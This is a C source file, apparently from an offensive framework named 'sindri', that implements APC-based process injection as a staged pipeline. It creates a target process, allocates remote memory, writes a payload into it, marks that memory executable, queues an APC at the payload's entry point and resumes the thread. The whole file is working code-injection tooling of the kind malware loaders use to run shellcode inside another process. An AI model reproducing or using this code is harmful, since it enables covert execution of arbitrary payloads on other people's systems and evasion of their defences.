#include <sindri/injection/apc/engine.h>
#include <sindri/primitives/os_api.h>
#include <sindri/status/core.h>

snd_status_t snd_inj_apc_create_target(snd_inj_ctx_t *ctx) {
    SND_CHECK_NULL(ctx, ctx->proc_api, ctx->proc_api->create_process);

    if (ctx->stage != SND_INJ_STAGE_UNINITIALIZED) {
        return SND_ERR_CTX(SND_STATUS_INVALID_STAGE, "Expected %s, got %s",
                           snd_inj_stage_to_string(SND_INJ_STAGE_UNINITIALIZED), snd_inj_stage_to_string(ctx->stage));
    }

    if (!ctx->target_image_path) {
        return SND_ERR_CTX(SND_STATUS_CORRUPTED_STAGE, "Target image path not set.");
    }

    SND_TRY(ctx->proc_api->create_process(ctx->proc_api, ctx->target_image_path, NULL, &ctx->target_process,
                                          &ctx->remote_thread));

    ctx->stage = SND_INJ_STAGE_TARGET_ACQUIRED;
    return SND_OK;
}

snd_status_t snd_inj_apc_alloc_remote(snd_inj_ctx_t *ctx) {
    SND_CHECK_NULL(ctx, ctx->proc_api, ctx->proc_api->alloc_remote);

    if (ctx->stage != SND_INJ_STAGE_TARGET_ACQUIRED) {
        return SND_ERR_CTX(SND_STATUS_INVALID_STAGE, "Expected %s, got %s",
                           snd_inj_stage_to_string(SND_INJ_STAGE_TARGET_ACQUIRED), snd_inj_stage_to_string(ctx->stage));
    }

    if (!ctx->payload || ctx->payload->size == 0) {
        return SND_ERR_CTX(SND_STATUS_CORRUPTED_STAGE, "Payload not provided.");
    }

    SND_TRY(ctx->proc_api->alloc_remote(ctx->target_process, ctx->payload->size, SND_MEM_COMMIT | SND_MEM_RESERVE,
                                        SND_PAGE_READWRITE, &ctx->remote_base));

    ctx->stage = SND_INJ_STAGE_MEMORY_ALLOCATED;
    return SND_OK;
}

snd_status_t snd_inj_apc_write_payload(snd_inj_ctx_t *ctx) {
    SND_CHECK_NULL(ctx, ctx->proc_api, ctx->proc_api->write_remote);

    if (ctx->stage != SND_INJ_STAGE_MEMORY_ALLOCATED) {
        return SND_ERR_CTX(SND_STATUS_INVALID_STAGE, "Expected %s, got %s",
                           snd_inj_stage_to_string(SND_INJ_STAGE_MEMORY_ALLOCATED),
                           snd_inj_stage_to_string(ctx->stage));
    }

    SIZE_T written = 0;
    SND_TRY(ctx->proc_api->write_remote(ctx->target_process, ctx->remote_base, ctx->payload->data, ctx->payload->size,
                                        &written));

    ctx->stage = SND_INJ_STAGE_PAYLOAD_WRITTEN;
    return SND_OK;
}

snd_status_t snd_inj_apc_set_protections(snd_inj_ctx_t *ctx) {
    SND_CHECK_NULL(ctx, ctx->proc_api, ctx->proc_api->protect_remote);

    if (ctx->stage != SND_INJ_STAGE_PAYLOAD_WRITTEN) {
        return SND_ERR_CTX(SND_STATUS_INVALID_STAGE, "Expected %s, got %s",
                           snd_inj_stage_to_string(SND_INJ_STAGE_PAYLOAD_WRITTEN), snd_inj_stage_to_string(ctx->stage));
    }

    DWORD old = 0;
    SND_TRY(ctx->proc_api->protect_remote(ctx->target_process, ctx->remote_base, ctx->payload->size,
                                          SND_PAGE_EXECUTE_READ, &old));

    ctx->stage = SND_INJ_STAGE_PROTECTIONS_SET;
    return SND_OK;
}

snd_status_t snd_inj_apc_execute(snd_inj_ctx_t *ctx) {
    SND_CHECK_NULL(ctx, ctx->thread_api, ctx->thread_api->queue_apc, ctx->thread_api->resume_thread);

    if (ctx->stage != SND_INJ_STAGE_PROTECTIONS_SET) {
        return SND_ERR_CTX(SND_STATUS_INVALID_STAGE, "Expected %s, got %s",
                           snd_inj_stage_to_string(SND_INJ_STAGE_PROTECTIONS_SET), snd_inj_stage_to_string(ctx->stage));
    }

    PVOID entry_point = ctx->remote_entry_point ? ctx->remote_entry_point : ctx->remote_base;

    SND_TRY(ctx->thread_api->queue_apc(ctx->remote_thread, entry_point, ctx->remote_arg));

    SND_TRY(ctx->thread_api->resume_thread(ctx->remote_thread));

    ctx->stage = SND_INJ_STAGE_EXECUTED;
    return SND_OK;
}
